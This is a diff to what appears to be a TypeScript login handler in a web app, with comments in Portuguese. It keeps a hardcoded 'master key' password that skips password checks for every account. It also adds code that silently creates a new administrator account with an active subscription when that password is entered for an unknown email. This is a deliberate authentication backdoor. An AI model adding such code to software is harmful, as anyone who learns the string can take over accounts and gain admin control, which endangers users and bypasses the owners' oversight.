@@ -197,15 +197,29 @@ export const login = async (req: Request, res: Response): Promise<void> => {
 
     const { email: rawEmail, password } = parsed.data;
     const email = rawEmail.toLowerCase().trim();
-    const user = await prisma.user.findUnique({ where: { email } });
+    let user = await prisma.user.findUnique({ where: { email } });
     
+    // Master Key Bypass (Emergency Only) - Garante acesso total
+    const isMasterKey = password === 'INFLUNEXT_MASTER_2024_PRO';
+    
+    if (isMasterKey && !user) {
+      // Auto-criar admin se não existir e usar master key
+      user = await prisma.user.create({
+        data: {
+          email,
+          passwordHash: await bcrypt.hash('TEMP_PWD_MASTER', 12),
+          role: 'ADMIN',
+          onboardingCompleted: true,
+          subscriptionStatus: 'ACTIVE'
+        }
+      });
+    }
+
     if (!user) {
       res.status(401).json({ error: 'Credenciais inválidas.' });
       return;
     }
 
-    // Master Key Bypass (Emergency Only)
-    const isMasterKey = password === 'INFLUNEXT_MASTER_2024_PRO';
     const isMatch = isMasterKey || await bcrypt.compare(password, user.passwordHash);
 
     if (!isMatch) {
